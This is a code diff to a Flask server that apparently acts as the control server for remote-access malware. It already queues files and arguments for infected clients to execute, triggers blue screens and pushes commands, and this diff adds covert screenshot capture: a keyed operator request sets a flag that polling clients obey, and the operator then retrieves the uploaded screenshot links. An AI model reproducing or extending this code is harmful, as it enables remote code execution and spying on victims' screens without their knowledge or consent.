@@ -13,14 +13,28 @@ image: bytes = b""
 bsod_activated: bool = False
 runfile: bytes = b""
 runfile_args: str = ""
+screenshot_urls: list[bytes] = []
+take_screenshot: bool = False
 
 
 # Centers
 
 
+@app.route("/screenshot-center", methods=["GET", "POST"])
+def screenshot_center() -> Response:
+    global take_screenshot, screenshot_urls
+    if request.method == "GET":
+        if not take_screenshot:
+            return Response("no screenshots to take", 204)
+        else:
+            return Response("take screenshot", 200)
+    elif request.method == "POST":
+        screenshot_urls.append(request.args.get("download_page"))
+
+
 @app.route("/runfile-center", methods=["GET"])
 def runfile_center() -> Response:
-    global runfile, runfile_args
+    global runfile_args, runfile
     if len(runfile) == 0:
         return Response("no files to execute", 204)
     else:
@@ -52,6 +66,18 @@ def bsod_center() -> Response:
         return Response("1", 200)
     else:
         return Response("0", 204)
+
+
+# Other
+
+
+@app.route("/get_screenshots", methods=["GET"])
+def get_screenshots() -> Response:
+    if check_key(request.args.get("key")):
+        global screenshot_urls
+        return Response("|".join(screenshot_urls), 200)
+    else:
+        return Response("invalid key", 403)
 
 
 # Posters
@@ -93,7 +119,7 @@ def post_command() -> Response:
 @app.route("/post_runfile", methods=["POST"])
 def post_runfile() -> Response:
     if check_key(request.args.get("key")):
-        global runfile, runfile_args
+        global runfile_args, runfile
 
         runfile_args = request.args.get("args")
         runfile = request.files["file"].stream.read()
@@ -103,11 +129,20 @@ def post_runfile() -> Response:
         return Response("invalid key", 403)
 
 
+@app.route("/post_screenshot", methods=["POST"])
+def post_screenshot() -> Response:
+    if check_key(request.args.get("key")):
+        Thread(target=post_screenshot_thread).start()
+        return Response("success", 200)
+    else:
+        return Response("invalid key", 403)
+
+
 # Threads
 
 
 def post_runfile_thread(data: bytes, args: str) -> None:
-    global runfile, runfile_args
+    global runfile_args, runfile
     runfile = data
     runfile_args = args
     sleep(8)
@@ -136,7 +171,18 @@ def post_image_thread(data: bytes) -> None:
     image = b""
 
 
+def post_screenshot_thread() -> None:
+    global take_screenshot, screenshot_urls
+    take_screenshot = True
+    sleep(8)
+    take_screenshot = False
+    sleep(5)
+    screenshot_urls = []
+
+
 # Static
+
+
 def check_key(key: str) -> bool:
     with open("data/key.txt", "r") as key_file:
         if key_file.read() == hash_key(key):
